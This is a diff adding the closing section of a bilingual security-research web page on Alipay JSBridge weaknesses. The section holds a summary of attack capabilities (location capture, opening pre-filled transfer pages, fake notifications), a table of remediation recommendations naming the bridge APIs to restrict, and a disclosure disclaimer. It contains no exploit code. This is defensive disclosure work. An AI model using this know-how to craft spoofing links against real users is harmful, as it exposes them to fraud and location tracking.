+    <p>We publish this technical analysis not to argue about whether something is a "vulnerability." <strong>We are simply publicly describing a fact: an attacker can, through a single link, obtain GPS location from Alipay, open transfer pages, and display fake notifications — without the user understanding the consequences.</strong> Readers can judge for themselves whether this is a security concern worth attention.</p>
+
+    <div class="callout info" style="margin-top: 20px;">
+      <p><strong>Important Clarification</strong>: None of the attack chains described in this article can achieve "zero-interaction automatic transfers/debits." Fund transfers still require the user to actively tap the confirmation button. The core risk we discuss is: under the combined attack of UI spoofing + social engineering + pre-filled information, the probability of users making erroneous operations is significantly increased. We strictly distinguish between "page navigation succeeded" and "fund operation completed," and make no exaggerations.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 10. RECOMMENDATIONS ==================== -->
+<section id="recommendations">
+  <h2><span class="num">10</span>
+    <span class="zh">修复建议</span>
+    <span class="en">Remediation Recommendations</span>
+  </h2>
+
+  <div class="zh">
+    <p>尽管厂商将这些归类为"正常功能"，我们仍然提供以下技术建议以供参考：</p>
+  </div>
+  <div class="en">
+    <p>Despite the vendor classifying these as "normal features," we still offer the following technical recommendations for consideration:</p>
+  </div>
+
+  <table>
+    <tr>
+      <th>#</th>
+      <th>
+        <span class="zh">建议</span><span class="en">Recommendation</span>
+      </th>
+      <th>
+        <span class="zh">覆盖问题</span><span class="en">Addresses</span>
+      </th>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>
+        <span class="zh"><strong>JSBridge 域名白名单</strong>：非阿里巴巴域名禁止调用 <code>startApp</code>、<code>pushWindow</code>、<code>tradePay</code>、<code>getLocation</code></span>
+        <span class="en"><strong>JSBridge domain whitelist</strong>: Block <code>startApp</code>, <code>pushWindow</code>, <code>tradePay</code>, <code>getLocation</code> for non-Alibaba domains</span>
+      </td>
+      <td>V-01~V-07</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>
+        <span class="zh"><strong>startApp 参数过滤</strong>：外部页面调用 <code>startApp</code> 时禁止传递 <code>param</code>（预填账号/金额）</span>
+        <span class="en"><strong>startApp parameter filtering</strong>: Block <code>param</code> passing (pre-fill account/amount) when called from external pages</span>
+      </td>
+      <td>V-01, V-02</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>
+        <span class="zh"><strong>pushWindow URL 限制</strong>：禁止 <code>pushWindow</code> 加载 <code>alipays://</code> scheme 和内部 URL</span>
+        <span class="en"><strong>pushWindow URL restriction</strong>: Block <code>pushWindow</code> from loading <code>alipays://</code> schemes and internal URLs</span>
+      </td>
+      <td>V-02, V-03, V-12</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>
+        <span class="zh"><strong>tradePay 来源校验</strong>：<code>tradePay</code> 必须验证调用来源为受信任的 H5 应用</span>
+        <span class="en"><strong>tradePay source validation</strong>: <code>tradePay</code> must verify calling source is a trusted H5 app</span>
+      </td>
+      <td>V-04</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>
+        <span class="zh"><strong>getLocation 权限弹窗</strong>：外部页面调用时必须显示用户确认弹窗</span>
+        <span class="en"><strong>getLocation permission dialog</strong>: Must show user consent dialog when called from external pages</span>
+      </td>
+      <td>V-07</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>
+        <span class="zh"><strong>DeepLink 敏感页面保护</strong>：敏感功能的 DeepLink 需验证调用来源或要求二次确认</span>
+        <span class="en"><strong>DeepLink sensitive page protection</strong>: Sensitive function DeepLinks should verify calling source or require secondary confirmation</span>
+      </td>
+      <td>V-06, V-10, V-11</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>
+        <span class="zh"><strong>UI 欺骗防护</strong>：外部页面禁止调用 <code>toast</code>、<code>setTitle</code></span>
+        <span class="en"><strong>UI spoofing protection</strong>: Block <code>toast</code>, <code>setTitle</code> from external pages</span>
+      </td>
+      <td>V-08</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>
+        <span class="zh"><strong>"继续访问"警告增强</strong>：明确告知用户外部页面将获得的 API 权限</span>
+        <span class="en"><strong>Enhanced "Continue" warning</strong>: Explicitly inform users of the API permissions the external page will gain</span>
+      </td>
+      <td>All</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>
+        <span class="zh"><strong>数据外传防护</strong>：WebView 内 XHR/Image 请求检查目标域名</span>
+        <span class="en"><strong>Data exfiltration prevention</strong>: Check target domain for XHR/Image requests within WebView</span>
+      </td>
+      <td>V-05, V-15~V-17</td>
+    </tr>
+  </table>
+</section>
+
+<!-- ==================== DISCLAIMER ==================== -->
+<section>
+  <h2>
+    <span class="zh">免责声明</span>
+    <span class="en">Disclaimer</span>
+  </h2>
+
+  <div class="callout info">
+    <div class="zh">
+      <ul>
+        <li>本研究完全出于安全研究和教育目的。</li>
+        <li>所有测试均在研究者自己的设备上进行。</li>
+        <li>测试账户为研究者本人账户。</li>
+        <li>在公开发布之前，已通过多轮负责任披露向蚂蚁集团报告了全部发现。</li>
+        <li>厂商回复这些是"正常功能"，因此公开讨论不存在任何法律或道德问题。</li>
+        <li>本文不包含任何可直接用于攻击的完整 PoC 代码（关键参数已脱敏）。</li>
+        <li>我们对每个发现都诚实标注了验证状态，包括防护生效的部分。</li>
+      </ul>
+    </div>
+    <div class="en">
+      <ul>
+        <li>This research was conducted solely for security research and educational purposes.</li>
+        <li>All testing was performed on the researcher's own devices.</li>
+        <li>Test accounts belong to the researcher.</li>
+        <li>All findings were reported to Ant Group through multiple rounds of responsible disclosure before public release.</li>
+        <li>The vendor responded that these are "normal features," therefore public discussion poses no legal or ethical concerns.</li>
+        <li>This article does not contain any complete PoC code that could be directly used for attacks (critical parameters are sanitized).</li>
+        <li>We honestly labeled the verification status of each finding, including parts where defenses are working.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+</div>
+
+<!-- ==================== CONTACT ==================== -->
+<section>
+  <h2>
+    <span class="zh">联系我们</span>
+    <span class="en">Contact</span>
+  </h2>
+  <div class="zh">
+    <p>如果蚂蚁集团在阅读本文后希望进一步沟通、请求澄清或要求更新特定内容，请发送邮件至 <strong>feng@innora.ai</strong>。如果相关问题在后续版本中得到修复，我们将及时更新本文并标注修复状态。</p>
+    <p>如果其他安全研究人员对本文中的技术分析有疑问或想要交流，同样欢迎联系。</p>
+  </div>
+  <div class="en">
+    <p>If Ant Group wishes to discuss further, request clarification, or ask for specific content updates after reading this article, please email <strong>feng@innora.ai</strong>. If the issues discussed here are addressed in future versions, we will promptly update this article with the fix status.</p>
+    <p>Other security researchers with questions about the technical analysis or who wish to exchange findings are also welcome to reach out.</p>
+  </div>
+</section>
+
+<!-- ==================== FOOTER ==================== -->
+<footer>
+  <p>&copy; 2026 Innora AI Security Research. All rights reserved.</p>
+  <p>feng@innora.ai | <a href="https://innora.ai">innora.ai</a></p>
+  <p style="margin-top: 12px; font-size: 11px; color: #555;">
+    <span class="zh">本文发布于 2026-03-11。如蚂蚁集团在此之后修复了上述问题，我们将更新本文予以说明。</span>
+    <span class="en">Published 2026-03-11. If Ant Group addresses the above issues after this date, we will update this article accordingly.</span>
+  </p>
+</footer>
+
+<script>
+function setLang(lang) {
+  document.body.className = lang === 'en' ? 'lang-en' : '';
+  document.getElementById('btn-zh').className = lang === 'zh' ? 'active' : '';
+  document.getElementById('btn-en').className = lang === 'en' ? 'active' : '';
+  localStorage.setItem('zfb-lang', lang);
+}
+// Restore language preference
+var saved = localStorage.getItem('zfb-lang');
+if (saved) setLang(saved);
+</script>
+
+</body>
+</html>
